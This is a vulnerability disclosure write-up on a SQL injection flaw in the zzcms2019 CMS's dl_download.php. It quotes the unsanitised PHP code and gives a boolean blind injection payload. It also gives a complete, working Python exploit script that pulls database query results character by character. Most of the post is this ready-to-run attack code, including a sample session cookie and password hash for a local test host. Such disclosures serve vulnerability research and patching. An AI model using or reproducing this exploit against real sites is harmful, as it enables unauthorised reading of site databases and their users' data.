# zzcms2019 SQL injection vulnerability in dl_download

The front desk registers the company type account publishing agent (local test, the zzcms_dl table in the database needs data)

![](https://i.loli.net/2019/09/20/XhR1fFP73qlAn6M.png)

Local testing requires the user group to have the right to download proxy information (for convenience, open directly in the background, simulate real vip users)

The vulnerability code is located at line 68 of `/dl/dl_download.php`, some of the key codes are as follows

```php
If(!empty($_POST['id'])){
    For($i=0; $i<count($_POST['id']);$i++){
    $id=$id.($_POST['id'][$i].',');
}
}else{
$founderr=1;
$ErrMsg="<li>Operation failed! Please select the information to download</li>";
}
$id=substr($id,0,strlen($id)-1);//Remove the last ","

If (isset($_POST['FileExt'])){
$FileExt=$_POST['FileExt'];
}else{
$FileExt="xls";
}

. . . . . . . . .

If ($FileExt=="xls"){
Header("Content-type:application/vnd.ms-excel;");
Header("Content-Disposition:filename=dls_".date('Y-m-d H:i:s').".xls");
}elseif ($FileExt=="doc"){
Header("Content-type:application/vnd.ms-word;");
Header("Content-Disposition:filename=dls_".date('Y-m-d H:i:s').".doc");
}

If (strpos($id,",")>0){
$sql="select * from zzcms_dl where passed=1 and id in (". $id .") order by id desc";
}else{
$sql="select * from zzcms_dl where passed=1 and id='$id'";
}
$rs=query($sql);
```

There is no single quoted package in and id in (". $id ."), so you can construct the following payload to make a boolean blind injection.

`FileExt=wtf&id[0]=9999999,(if(((ascii(substr((select @@version),1,1)))=53),1,0)))#` 

![](https://i.loli.net/2019/09/20/1uzdEiqoZVvObRs.png)

Here is exp:

```python
#coding: utf-8
import requests
import string

url = 'http://{}/dl/dl_download.php'

#header 头，自己根据实际环境做修改
headers = {
'Host':'{}',
'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:68.0) Gecko/20100101 Firefox/68.0',
'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
'Accept-Encoding':'gzip, deflate',
'Content-Type':'application/x-www-form-urlencoded',
'Content-Length':'23',
'Connection':'keep-alive',
'Cookie':'{}',
'Upgrade-Insecure-Requests':'1'
}

def Sqli(host,sql):
	global url
	url = url.format(host)
	sqli = "ascii(substr(({}),{},1)))={}"
	sqli_2 = "0,(if((({}),1,0)))#"
	res_data = ""
	s = requests.session()
	i = 1
	while 1:
		tmp_data = res_data
		for c in string.printable:
			post_sqli_data = sqli_2.format(sqli.format(sql,str(i),ord(c)))
			data = {'id[0]':post_sqli_data,'FileExt':'wtf'}
			res = s.post(url,data=data, headers=headers)
			if '13333333333' in res.text: #自己根据实际环境做修改
				res_data += c
				print (res_data)
				break
		i += 1
		if tmp_data == res_data:
			print ('完成')
			return 

if __name__ == "__main__":
	#设置 host 地址
	host = "127.0.0.1:9000"
	#设置用户 cookie
	user_cookie = "PHPSESSID=dh6bhd10g47tjc4jlhqf2leqnn; UserName=admin2; PassWord=343b1c4a3ea721b2d640fc8700db0f36"
	sql = "select group_concat(user(),version(),@@version_compile_os)"
	headers['Host'] = headers['Host'].format(host)
	headers['Cookie'] = headers['Cookie'].format(user_cookie)
	Sqli(host,sql)
```


![](https://i.loli.net/2019/09/20/mr4ca62fn3AVgIq.png)